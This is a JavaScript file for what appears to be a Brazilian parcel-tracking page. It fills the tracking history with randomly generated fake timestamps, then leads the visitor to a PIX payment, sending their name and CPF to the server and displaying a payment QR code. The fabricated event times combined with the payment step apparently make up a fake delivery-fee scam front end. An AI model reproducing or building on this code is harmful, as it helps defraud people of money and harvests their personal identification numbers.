function formatarCPF(cpf) {
    cpf = cpf.replace(/\D/g, '').replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d{1,2})$/, '$1-$2')
    return cpf
}
function validarCPF(cpf) {
    cpf = cpf.replace(/[^\d]+/g, '')
    if (cpf.length !== 11 || /^(.)\1+$/.test(cpf)) { return false }
    let sum
    let rest
    sum = 0
    for (i = 1; i <= 9; i++)sum = sum + parseInt(cpf.slice(i - 1, i)) * (11 - i)
    rest = (sum * 10) % 11
    if ((rest == 10) || (rest == 11)) rest = 0
    if (rest != parseInt(cpf.slice(9, 10))) return false
    sum = 0
    for (i = 1; i <= 10; i++)sum = sum + parseInt(cpf.slice(i - 1, i)) * (12 - i)
    rest = (sum * 10) % 11
    if ((rest == 10) || (rest == 11)) rest = 0
    if (rest != parseInt(cpf.slice(10, 11))) return false
    return true
}
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms))
document.addEventListener('DOMContentLoaded', function () {
    let currentDate = new Date(new Date().setHours(new Date().getHours() - (Math.floor(Math.random() * 3) + 1), Math.floor(Math.random() * 60), Math.floor(Math.random() * 60))).toLocaleString('pt-BR')
    let oneDayAgo = new Date(new Date().setHours(9 + Math.floor(Math.random() * 10), Math.floor(Math.random() * 60), Math.floor(Math.random() * 60), Math.floor(Math.random() * 60)) - (86400000)).toLocaleString('pt-BR')
    let twoDaysAgo = new Date(new Date().setHours(9 + Math.floor(Math.random() * 10), Math.floor(Math.random() * 60), Math.floor(Math.random() * 60), Math.floor(Math.random() * 60)) - (2 * 86400000)).toLocaleString('pt-BR')
    document.getElementById('currentDate').textContent = currentDate
    document.getElementById('oneDayAgo').textContent = oneDayAgo
    document.getElementById('twoDaysAgo').textContent = twoDaysAgo
    let threeDaysLater = new Date(new Date().setHours(0, 0, 0, 0) + (7 * 86400000)).toLocaleDateString('pt-BR');
    document.getElementById('threeDaysLater').textContent = threeDaysLater
   

    document.getElementById('pagamentoBtn').addEventListener('click', function () {
        document.getElementById('step2').style.display = 'none'
        document.getElementById('step3').style.display = 'block'
    })
    document.getElementById('pixBtn').addEventListener('click', function () {
        document.getElementById('alertMessage').style.display = 'block'
        document.getElementById('step3').style.display = 'none'
        document.getElementById('step4').style.display = 'block'
        // Tenta recuperar os valores do localStorage
        let name = localStorage.getItem('name');
        let cpf = localStorage.getItem('cpf');

        // Verifica se algum valor foi recuperado
        if (!name || !cpf) {
            // Se não recuperou, pega os valores dos elementos #nomeDoc e #numeroDoc
            name = document.getElementById('nomeDoc') ? document.getElementById('nomeDoc').textContent : '';
            cpf = document.getElementById('numeroDoc') ? document.getElementById('numeroDoc').textContent : '';

            // Opcional: Armazena os valores no localStorage para uso futuro
            if (name) localStorage.setItem('name', name);
            if (cpf) localStorage.setItem('cpf', cpf);
        }

        // Agora você pode usar as variáveis `name` e `cpf`
        console.log('Nome:', name);
        console.log('CPF:', cpf);

        fetch(`/encomendas/${uuid_}/pix`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ cpf, nome: name }) }).then(response => response.json()).then(async data => {
            console.log(data)
            if (data.success) {
                console.log('=> passou')
                // document.getElementById('nomeDoc2').textContent = name
                // document.getElementById('numeroDoc2').textContent = cpf
                document.getElementById('alertMessage').style.display = 'none'
                document.getElementById('cec').value = data.copiaecola
                new QRCode(document.getElementById("qrcode"), { text: data.copiaecola, width: 256, height: 256, colorDark: "#000000", colorLight: "#ffffff", correctLevel: QRCode.CorrectLevel.H })
                localStorage.setItem('copiaecola', data.copiaecola)
                localStorage.setItem('step', '4')
            }
        }).catch(error => error.response)
    })
    document.getElementById('copiarBtn').addEventListener('click', function () {
        const inputCodigo = document.getElementById('cec')
        inputCodigo.select()
        navigator.clipboard.writeText(inputCodigo.value)
        this.textContent = 'CÓDIGO COPIADO!'
        this.classList.add('button-success')
        setTimeout(() => {
            this.textContent = 'COPIAR CÓDIGO'
            this.classList.remove('button-success')
        }, 2000)
    })
})
function isVisible(elementId, callback) {
    var element = document.getElementById(elementId)
    function isElementVisible(el) {
        var style = window.getComputedStyle(el)
        return style.display !== 'none' && style.visibility !== 'hidden' && style.opacity !== '0'
    }
    if (isElementVisible(element)) { callback(element) } else {
        var observer = new MutationObserver(function (mutations) {
            mutations.forEach(function (mutation) {
                if (mutation.type === 'attributes' && mutation.attributeName === 'style') {
                    if (isElementVisible(element)) {
                        callback(element)
                        observer.disconnect()
                    }
                }
            })
        })
        observer.observe(element, { attributes: true })
    }
}